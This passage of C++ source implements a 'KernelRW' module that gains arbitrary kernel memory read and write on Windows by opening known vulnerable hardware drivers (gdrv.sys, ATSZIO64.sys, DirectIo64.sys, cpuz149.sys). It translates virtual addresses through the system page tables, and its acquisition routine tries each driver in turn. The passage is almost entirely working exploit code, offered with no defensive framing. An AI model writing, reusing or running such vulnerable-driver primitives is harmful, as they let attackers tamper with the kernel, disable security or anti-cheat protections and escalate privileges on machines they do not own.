            DWORD val = LNVMSRIO_ReadPhys32(ctx.device, physAddr + off);
            memcpy(p + off, &val, size - off);
        }
        return true;
    }
    default:
        return false;
    }
}

static bool WritePhysBuf(const Context& ctx, DWORD64 physAddr, const void* src, DWORD size) {
    if (!size) return true;
    switch (ctx.type) {
    case Backend::DIRECTIO:
        return DIRECTIO_WritePhysBuf(ctx.device, physAddr, src, size);
    case Backend::ATSZIO: {
        const uint8_t* p = (const uint8_t*)src;
        DWORD off = 0;
        while (off + 4 <= size) {
            DWORD val; memcpy(&val, p + off, 4);
            if (!ATSZIO_WritePhys32(ctx.device, physAddr + off, val)) return false;
            off += 4;
        }
        if (off < size) {
            DWORD existing = ATSZIO_ReadPhys32(ctx.device, physAddr + off);
            memcpy(&existing, p + off, size - off);
            if (!ATSZIO_WritePhys32(ctx.device, physAddr + off, existing)) return false;
        }
        return true;
    }
    case Backend::CPUZ: {
        const uint8_t* p = (const uint8_t*)src;
        DWORD off = 0;
        while (off + 4 <= size) {
            DWORD val; memcpy(&val, p + off, 4);
            if (!CPUZ_WritePhys32(ctx.device, physAddr + off, val)) return false;
            off += 4;
        }
        if (off < size) {
            DWORD existing = CPUZ_ReadPhys32(ctx.device, physAddr + off);
            memcpy(&existing, p + off, size - off);
            if (!CPUZ_WritePhys32(ctx.device, physAddr + off, existing)) return false;
        }
        return true;
    }
    case Backend::LNVMSRIO: {
        const uint8_t* p = (const uint8_t*)src;
        DWORD off = 0;
        while (off + 4 <= size) {
            DWORD val; memcpy(&val, p + off, 4);
            if (!LNVMSRIO_WritePhys32(ctx.device, physAddr + off, val)) return false;
            off += 4;
        }
        if (off < size) {
            DWORD existing = LNVMSRIO_ReadPhys32(ctx.device, physAddr + off);
            memcpy(&existing, p + off, size - off);
            if (!LNVMSRIO_WritePhys32(ctx.device, physAddr + off, existing)) return false;
        }
        return true;
    }
    default:
        return false;
    }
}

// Page-aware bulk virtual read — chunks at 4KB boundaries, supports any CR3
static bool ReadBuffer(const Context& ctx, DWORD64 virtAddr, void* dest, size_t size) {
    if (!size) return true;
    if (ctx.type == Backend::GIO) {
        if (!GIO_IsValidKernelAddr(virtAddr)) return false;
        return GIO_Memcpy(ctx.device, (ULONG64)dest, virtAddr, (DWORD)size);
    }
    if (ctx.type == Backend::NONE || !ctx.cr3) return false;
    uint8_t* p = (uint8_t*)dest;
    size_t remaining = size;
    DWORD64 cur = virtAddr;
    while (remaining > 0) {
        DWORD64 phys = VirtToPhys(ctx, cur);
        if (!phys) return false;
        DWORD chunk = (DWORD)(0x1000 - (cur & 0xFFF));
        if ((size_t)chunk > remaining) chunk = (DWORD)remaining;
        if (!ReadPhysBuf(ctx, phys, p, chunk)) return false;
        p += chunk;
        cur += chunk;
        remaining -= chunk;
    }
    return true;
}

// Page-aware bulk virtual write
static bool WriteBuffer(const Context& ctx, DWORD64 virtAddr, const void* src, size_t size) {
    if (!size) return true;
    if (ctx.type == Backend::GIO) {
        if (!GIO_IsValidKernelAddr(virtAddr)) return false;
        return GIO_Memcpy(ctx.device, virtAddr, (ULONG64)src, (DWORD)size);
    }
    if (ctx.type == Backend::NONE || !ctx.cr3) return false;
    const uint8_t* p = (const uint8_t*)src;
    size_t remaining = size;
    DWORD64 cur = virtAddr;
    while (remaining > 0) {
        DWORD64 phys = VirtToPhys(ctx, cur);
        if (!phys) return false;
        DWORD chunk = (DWORD)(0x1000 - (cur & 0xFFF));
        if ((size_t)chunk > remaining) chunk = (DWORD)remaining;
        if (!WritePhysBuf(ctx, phys, p, chunk)) return false;
        p += chunk;
        cur += chunk;
        remaining -= chunk;
    }
    return true;
}

template<typename T>
static T ReadValue(const Context& ctx, DWORD64 addr) {
    T val{};
    ReadBuffer(ctx, addr, &val, sizeof(T));
    return val;
}

static Context MakeContextWithCR3(const Context& src, DWORD64 cr3) {
    Context ctx = src;
    ctx.cr3 = cr3;
    return ctx;
}

static void Close(Context& ctx) {
    if (ctx.device != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx.device);
        ctx.device = INVALID_HANDLE_VALUE;
    }
    ctx.type = Backend::NONE;
    ctx.cr3 = 0;
}

static const char* BackendName(Backend b) {
    switch (b) {
    case Backend::GIO:       return "gdrv.sys (GIO)";
    case Backend::LNVMSRIO:  return "LnvMSRIO.sys";
    case Backend::ATSZIO:    return "ATSZIO64.sys";
    case Backend::DIRECTIO:  return "DirectIo64.sys";
    case Backend::CPUZ:      return "cpuz149.sys";
    default:                 return "none";
    }
}

// ============================================================================
// Acquisition — try each backend in order
// ============================================================================

static Context TryLnvMSRIO(DWORD64 knownKernelBase) {
    Context ctx = {};
    HANDLE dev = LNVMSRIO_OpenDevice();
    if (dev == INVALID_HANDLE_VALUE) return ctx;

    bool la57 = false;
    DWORD64 cr3 = LNVMSRIO_FindSystemCR3(dev, knownKernelBase, la57);
    if (!cr3) {
        CloseHandle(dev);
        return ctx;
    }

    ctx.type = Backend::LNVMSRIO;
    ctx.device = dev;
    ctx.cr3 = cr3;
    ctx.la57 = la57;
    return ctx;
}

static Context TryATSZIO(DWORD64 knownKernelBase) {
    Context ctx = {};
    HANDLE dev = ATSZIO_OpenDevice();
    if (dev == INVALID_HANDLE_VALUE) return ctx;

    bool la57 = false;
    DWORD64 cr3 = ATSZIO_FindSystemCR3(dev, knownKernelBase, la57);
    if (!cr3) {
        CloseHandle(dev);
        return ctx;
    }

    ctx.type = Backend::ATSZIO;
    ctx.device = dev;
    ctx.cr3 = cr3;
    ctx.la57 = la57;
    return ctx;
}

static Context TryGIO() {
    Context ctx = {};
    HANDLE dev = GIO_OpenDevice();
    if (dev == INVALID_HANDLE_VALUE) return ctx;
    ctx.type = Backend::GIO;
    ctx.device = dev;
    return ctx;
}

static Context TryDirectIO(DWORD64 knownKernelBase) {
    Context ctx = {};
    HANDLE dev = DIRECTIO_OpenDevice();
    if (dev == INVALID_HANDLE_VALUE) return ctx;

    bool la57 = false;
    DWORD64 cr3 = DIRECTIO_FindSystemCR3(dev, knownKernelBase, la57);
    if (!cr3) {
        CloseHandle(dev);
        return ctx;
    }

    ctx.type = Backend::DIRECTIO;
    ctx.device = dev;
    ctx.cr3 = cr3;
    ctx.la57 = la57;
    return ctx;
}

static Context TryCPUZ(DWORD64 knownKernelBase) {
    Context ctx = {};
    HANDLE dev = CPUZ_OpenDevice();
    if (dev == INVALID_HANDLE_VALUE) return ctx;

    bool la57 = false;
    DWORD64 cr3 = CPUZ_FindSystemCR3(dev, knownKernelBase, la57);
    if (!cr3) {
        CloseHandle(dev);
        return ctx;
    }

    ctx.type = Backend::CPUZ;
    ctx.device = dev;
    ctx.cr3 = cr3;
    ctx.la57 = la57;
    return ctx;
}

static Context Acquire(DWORD64 knownKernelBase, std::string& diagOut) {
    // LnvMSRIO removed — causes BSOD on multiple systems

    Context ctx = TryATSZIO(knownKernelBase);
    if (ctx.type != Backend::NONE) {
        char tmp[80];
        sprintf_s(tmp, "KernelRW: ATSZIO CR3=0x%llX%s",
            (unsigned long long)ctx.cr3, ctx.la57 ? " (LA57)" : "");
        diagOut = tmp;
        return ctx;
    }

    ctx = TryGIO();
    if (ctx.type != Backend::NONE) {
        diagOut = "KernelRW: GIO";
        return ctx;
    }

    ctx = TryDirectIO(knownKernelBase);
    if (ctx.type != Backend::NONE) {
        char tmp[80];
        sprintf_s(tmp, "KernelRW: DirectIO CR3=0x%llX%s",
            (unsigned long long)ctx.cr3, ctx.la57 ? " (LA57)" : "");
        diagOut = tmp;
        return ctx;
    }

    ctx = TryCPUZ(knownKernelBase);
    if (ctx.type != Backend::NONE) {
        char tmp[80];
        sprintf_s(tmp, "KernelRW: CPUZ CR3=0x%llX%s",
            (unsigned long long)ctx.cr3, ctx.la57 ? " (LA57)" : "");
        diagOut = tmp;
        return ctx;
    }

    diagOut = "KernelRW: no backend available";
    return ctx;
}

} // namespace KernelRW
